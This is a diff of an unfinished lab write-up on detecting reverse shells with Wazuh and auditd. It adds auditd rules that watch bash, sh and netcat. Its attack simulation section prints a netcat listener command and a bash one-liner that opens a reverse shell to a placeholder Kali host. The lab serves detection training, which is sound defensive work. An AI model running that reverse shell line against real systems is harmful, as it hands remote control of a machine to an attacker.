@@ -1,3 +1,5 @@
+# THIS IS STILL IN WORKS
+
 # Reverse Shell Detection
 
 ## Objective
@@ -14,31 +16,40 @@ The activity was analyzed through Wazuh alerts, Linux logs, process activity, an
 
 ---
 
-## Lab Environment
+## Configuration 
+Most of the work is alredy done in [Malicious cmd](../use-cases/malicious-command-execution-auditd.md), Now all we need to do is create cutom rules to monitor and look out for reverse shell codes.<br>
 
-| Component | Purpose |
-|---|---|
-| Kali Linux | Attacker Machine |
-| Ubuntu Server | Victim Endpoint |
-| Wazuh Manager | SIEM & Alert Correlation |
-| Auditd | Linux Auditing |
-| Suricata | Network Monitoring |
+1. Agent VM
+    - open the custom rules file and add the following rules<br>
+    ```
+    -a always,exit -F arch=b64 -S execve -F auid>=1000 -k user_cmd_exec
 
----
-
+    -w /bin/bash -p x -k shell_execution
+    -w /bin/sh -p x -k shell_execution
+    -w /usr/bin/nc -p x -k reverse_shell
+    ```
+    - restart service <br>
+    `sudo auditctl -R /etc/audit/rules.d/custom.rules`
+    
 ## Attack Simulation
 
-### Step 1 — Start Listener on Kali
+1. Start Listener on Kali
 
-```bash
+```
 nc -lvnp 4444
 ```
 
 ---
 
-### Step 2 — Execute Reverse Shell on Target
+2. Execute Reverse Shell on Target
 
-```bash
+```
 bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
 ```
 
+3. Wazuh dashboard
+    - Login into wazuh dashboard 
+    - under agent -> Security events, you will find all the above commands alerts mapped to rule_id, mitre attack TTPs and other details.
+
+    - Refernce Image:
+        - []()
